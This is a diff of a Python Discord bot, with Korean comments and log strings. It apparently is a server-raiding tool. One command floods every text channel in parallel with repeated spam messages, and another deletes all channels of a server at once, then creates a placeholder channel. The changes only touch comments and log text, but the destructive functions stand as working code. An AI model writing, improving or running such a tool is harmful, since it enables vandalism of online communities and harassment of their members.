@@ -94,13 +94,12 @@ async def send_single_message(channel, message_text, index):
         return False
 
 async def spam_channel(channel, count, message_text):
-    # 너무 빠른 연사로 인한 API 차단(429 Rate Limit) 방지를 위해 약간의 간격을 두고 전송
     success_count = 0
     for i in range(count):
         res = await send_single_message(channel, message_text, i + 1)
         if res:
             success_count += 1
-        await asyncio.sleep(0.1)  # 레이트 리밋 방지 딜레이
+        await asyncio.sleep(0.1)
     return success_count
 
 @bot.command(name="메시지도배")
@@ -115,7 +114,6 @@ async def spam_messages(ctx, count: int, *, message_text: str):
     text_channels = guild.text_channels
     log(f"[REQUEST] User: {ctx.author} | Server: {guild.name} | Message spamming requested ({count} messages per channel, total {len(text_channels)} channels)")
 
-    # 모든 텍스트 채널에 비동기 병렬로 도배 실행
     tasks = [spam_channel(ch, count, message_text) for ch in text_channels]
     results = await asyncio.gather(*tasks)
     total_sent = sum(results)
@@ -197,22 +195,25 @@ async def delete_single_channel(channel):
 async def delete_all_channels(ctx):
     await delete_trigger_message(ctx)
     guild = ctx.guild
-    channels = guild.channels
+    # 카테고리/텍스트/음성 등 모든 채널 목록 수집
+    channels = list(guild.channels)
     total_count = len(channels)
 
-    log(f"[REQUEST] User: {ctx.author} | Server: {guild.name} | All channels deletion requested ({total_count} channels)")
+    log(f"[REQUEST] User: {ctx.author} | Server: {guild.name} | 모든 채널 삭제 요청 ({total_count}개 채널)")
 
+    # 비동기로 모든 채널 일괄 삭제
     tasks = [delete_single_channel(ch) for ch in channels]
     results = await asyncio.gather(*tasks)
     success_count = sum(1 for res in results if res is True)
 
-    log(f"[COMPLETE] 채널 삭제 완료: 총 {success_count} / {total_count}개 삭제")
+    log(f"[COMPLETE] 모든 채널 삭제 완료: 총 {success_count} / {total_count}개 삭제됨")
 
+    # 삭제가 완료된 후 대기용 기본 채널 생성
     try:
-        new_ch = await guild.create_text_channel(name="새로운 채널")
-        log(f"[SUCCESS] 삭제 후 채널 생성 완료: #{new_ch.name}")
+        new_ch = await guild.create_text_channel(name="새로운-채널")
+        log(f"[SUCCESS] 모든 채널 삭제 후 기본 채널 생성 완료: #{new_ch.name}")
     except Exception as e:
-        log(f"[FAILED] '새로운 채널' 생성 실패: {e}")
+        log(f"[FAILED] 삭제 후 기본 채널 생성 실패: {e}")
 
 @show_help.error
 @spam_messages.error
